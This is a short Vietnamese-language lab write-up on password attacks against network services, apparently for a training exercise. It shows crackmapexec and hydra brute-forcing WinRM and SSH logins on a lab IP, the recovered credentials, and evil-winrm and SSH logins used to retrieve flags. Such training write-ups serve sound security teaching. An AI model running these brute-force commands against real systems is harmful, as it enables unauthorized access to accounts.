<h1>Password Attacks: Network Services</h1>

![image](https://github.com/user-attachments/assets/a4f0bbce-5a49-4c50-9124-ba0733458f1c)

![image](https://github.com/user-attachments/assets/162084ec-59a1-4703-a8af-d94da14fad11)

![image](https://github.com/user-attachments/assets/260a06c9-3de9-49a8-a01c-e26be94cdfa8)

Chạy `crackmapexec winrm 10.129.167.69 -u username.list -p password.list` lấy user:pass từ 2 file và tấn công vét cạn:

![image](https://github.com/user-attachments/assets/f40f909e-5bec-42b9-9db6-ec5d4f217948)

Tôi có được john:november và chạy `evil-winrm -i 10.129.167.69 -u john -p november` để vào và tìm thấy flag trong Desktop

![image](https://github.com/user-attachments/assets/145f0f98-cc82-4842-9238-4a04e13fb867)

Dùng `hydra -L username.list -P password.list ssh://10.129.167.69` để tấn công vét cạn ssh:

![image](https://github.com/user-attachments/assets/d01dc777-4cf6-44e4-813c-ab22b405ea83)

Tôi có được dennis:rockstar, ssh vào và tìm thấy flag trong Desktop:

![image](https://github.com/user-attachments/assets/56fa5227-3033-4002-8c6c-c9d5a1db04cc)


Do tôi thấy có các user ở đây nên nghĩ chắc là 2 câu dưới cũng chỉ lanh quanh user này thôi nên tạo hẳn user.list để chứa mấy cái user này cho đẩy nhanh thời gian làm bài:

![image](https://github.com/user-attachments/assets/6f9a261b-a5a0-46ef-9b71-64b88c8980cf)

![image](https://github.com/user-attachments/assets/7791c747-33e3-4773-bb78-c97ff7df3c71)
